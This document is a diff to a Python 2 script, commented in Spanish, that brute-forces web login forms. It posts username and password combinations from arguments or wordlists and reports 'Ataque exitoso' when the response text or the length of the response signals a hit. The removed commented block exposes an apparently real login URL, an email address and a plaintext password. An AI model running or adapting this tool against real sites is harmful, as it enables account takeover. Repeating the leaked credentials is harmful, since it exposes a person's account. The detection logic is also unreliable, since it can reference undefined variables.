@@ -23,12 +23,29 @@ message = ''
 def single(url, userField, passField, user, pwd, userFile, pwdFile, message):
 	#Antes del ataque
 	mbefore = message
+	
 	#Login
+	req = requests.post(url)
+	for key, value in (req.headers).iteritems():
+		if key.startswith('content-length'):
+			cb = value
+		else: 
+			continue
+	
+	
 	payload = { userField : user, passField: pwd}
 	r = requests.post(url, data= payload)
-		
+	for key,value in (r.headers).iteritems():
+		if key.startswith('content-length'):
+			ca = value
+			op = int(ca) - int(cb)
+		else:
+			continue			
+	
+	
 	mafter =  r.text
-	if mbefore in mafter:
+	
+	if mbefore in mafter or op>=110 and op<=120:
 		print 'Ataque no exitoso con:'  + " User: " + user + " Password: " + pwd
 	else:
 		print "Ataque exitoso con:" + "User: " + user  + " Password: " + pwd
@@ -45,14 +62,31 @@ def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
 		for i in range(0,len(users)):
 			#Antes del ataque
 			mbefore = message
+			
+			
+			req = requests.post(url)
+			for key, value in (req.headers).iteritems():
+				if key.startswith('content-length'):
+					cb = value
+					#print value
+				else: 
+					continue
+	
 		
 			#Login
 			payload = { userField : users[i], passField: pwd}
 			r = requests.post(url, data= payload)
+			for key, value in (r.headers).iteritems():
+				if key.startswith('content-length'):
+					ca = value
+					op = int(ca) - int(cb)
+					#print op
+				else: 
+					continue
 	
 			#Login exitoso
 			mafter =  r.text
-			if mbefore in mafter:
+			if mbefore in mafter or op <= 0 or op>=110 and op<=120:
 				print 'Ataque no exitoso con:'  + " User: " + users[i] + " Password: " + pwd
 			else:
 				print "Ataque exitoso con:" + " User: " + users[i]  + " Password: " + pwd
@@ -69,13 +103,29 @@ def pwdFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
 			#Antes del ataque
 			mbefore = message
 		
+			req = requests.post(url)
+			for key, value in (req.headers).iteritems():
+				if key.startswith('content-length'):
+					cb = value
+					#print value
+				else: 
+					continue
+	
 			#Login
 			payload = { userField : user, passField: passwords[i]}
 			r = requests.post(url, data= payload)
+			for key, value in (r.headers).iteritems():
+				if key.startswith('content-length'):
+					ca = value
+					op = int(ca) - int(cb)
+					#print op
+				else: 
+					continue
+	
 	
 			#Login exitoso
 			mafter =  r.text
-			if mbefore in mafter:
+			if mbefore in mafter or op <= 0 or op>=110 and op<=120:
 				print 'Ataque no exitoso con:'  + " User: " + user + " Password: " + passwords[i]
 			else:
 				print "Ataque exitoso con:" + " User: " + user  + " Password: " + passwords[i]
@@ -104,14 +154,29 @@ def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message)
 				#Antes del ataque
 				mbefore = message
 				
+				req = requests.post(url)
+				for key, value in (req.headers).iteritems():
+					if key.startswith('content-length'):
+						cb = value
+						#print value
+					else: 
+						continue
 				#Login
 				payload = { userField : users[i], passField: passwords[j]}
 				
 				r = requests.post(url, data= payload)
+				for key, value in (r.headers).iteritems():
+					if key.startswith('content-length'):
+						ca = value
+						op = int(ca) - int(cb)
+						#print op
+					else: 
+						continue
 	
 				#Login exitoso
 				mafter =  r.text
-				if mbefore in mafter:
+				
+				if mbefore in mafter or op <= 0 or op>=110 and op<=120:
 					print 'Ataque no exitoso con:'  + " User: " + users[i] , " Password: " + passwords[j]
 				else:
 					print "Ataque exitoso con:" + " User: " + users[i]  , " Password: " + passwords[j]
@@ -156,50 +221,3 @@ def getParams(arg):
 
 		
 getParams(arg)
-
-
-
-'''
-import re
-import requests
-import argparse
-import sys
-from lxml.html import fromstring
-import os.path
-
-arg = ''
-url = 'https://aula.cert.unam.mx'
-#url = 'https://www.seguridad.unam.mx'
-userField = 'username'
-passField = 'password'
-user = 'cristian.monroy@bec.seguridad.unam.mx'
-pwd = 'NeiNaruto27..'
-userFile = ''
-pwdFile = ''
-message = ''
-	
-
-r = requests.post(url)
-salida = []
-af = []
-res = r.headers
-
-for key, value in res.iteritems():
-	salida.append(value)
-
-var = salida[0]
-print var
-
-
-payload = { userField : user, passField: pwd}
-r = requests.post(url, data= payload)
-after =  r.headers
-
-for key, value in after.iteritems():
-	af.append(value)
-	
-var1 = af[0]
-print var1
-
-'''
-	
